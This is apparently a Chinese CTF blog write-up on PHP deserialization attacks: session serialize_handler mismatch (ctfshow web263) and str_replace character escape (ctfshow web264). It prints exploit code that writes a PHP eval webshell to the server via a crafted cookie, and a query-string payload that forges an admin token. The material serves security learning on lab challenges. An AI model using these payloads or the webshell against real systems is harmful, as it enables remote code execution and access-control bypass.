---
title: 简单的反序列化
date: 2022/9/16 13:23:56
cover: https://i.postimg.cc/NMWzHWLm/us1.jpg
categories:
- CTF
tags:
- web
- 反序列化
---

# 反序列化--存储方式与字符逃逸

## session的存储方式

- `ini_set('session.serialize_handler', 'php');` 

  ```
  <?php
  session_start();
  ini_set('session.serialize_handler', 'php');
  class User{
      public $a="admin";
  }
  $user=new User();
  $_SESSION['user']=$user;
  //结果为：user|O:4:"User":1:{s:1:"a";s:5:"admin";}
  ```

- `ini_set('session.serialize_handler', 'php_serialize');`

  ```
  <?php
  ini_set('session.serialize_handler', 'php_serialize');
  session_start();
  class User{
      public $a="admin";
  }
  $user=new User();
  $_SESSION['user']=$user;
  //结果为：a:1:{s:4:"user";O:4:"User":1:{s:1:"a";s:5:"admin";}}
  ```

  这两种方式中以 `php` 作为存储方式是以 `|` 作为分隔符，**右边则是序列化的内容**，可以通过构造payload上传木马文件

### 例题：ctfshow web263

```php
# inc.php
# 设置处理方式为默认的php处理方式
ini_set('session.serialize_handler', 'php');
# 可以构造恶意参数的代码
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}
```

此时可以构造恶意payload

```php
<?php
session_start();
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
}
# 一句话木马写长一些，以免发生未知错误
$user=new User('1.php','<?php eval($_POST[1]);phpinfo();?>');
echo base64_encode('|'.serialize($user));
# fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==
?>
```

准备工作大致到这里就结束了，接下来的解题步骤

1. 在 `index.php` 中修改 `limit` 的 cookie 值，刷新界面写入木马
2. 登入 `check.php?u=admin&pass=123` ，用回显来判断是否写入成功
3. 登入 `log-1.php` ，post执行操作获取flag

## 字符逃逸问题

`str_replace` 函数会造成序列化的字符逃逸问题

### 例题：ctfshow web264

```php
# index.php
<?php
    error_reporting(0);
session_start();

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
?>
```

```php
# message.php
<?php
    session_start();
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
?>
```

分析代码可知只有当 token = 'admin' 的时候才能拿到flag，每次替换就可以逃逸一个字符，我们一共需要逃逸27个字符，exp如下

```php
<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
# 需要做到：";s:5:"token";s:5:"admin";} 可以闭合
$f = 'a';
$m = 'b';
$t = 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck';
$msg= serialize(new message($f,$m,$t));
$umsg = str_replace('fuck', 'loveU', $msg);
echo serialize($umsg);
# s:232:"O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:1:"b";s:2:"to";s:108:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:5:"token";s:5:"admin";}";
?>
```

构造payload

```
?f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

